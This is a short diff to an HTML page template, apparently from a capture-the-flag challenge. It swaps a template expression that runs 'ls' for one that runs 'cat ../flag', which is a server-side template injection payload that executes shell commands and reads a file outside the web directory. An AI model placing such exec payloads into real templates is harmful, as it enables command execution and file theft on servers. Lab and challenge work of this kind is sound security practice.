@@ -30,7 +30,7 @@
                 <hr>
                 <p>Express yourself through words and creativity</p>
                 <p>You provide the templates, we provide the data!</p>
-                <p>Shell Command: {{- $shellEx := exec "ls" }}</p>
+                <p>Shell Command: {{- $shellEx := exec "cat ../flag" }}</p>
             </div>
         </div>
         <div class="row mt-2 mb-5">
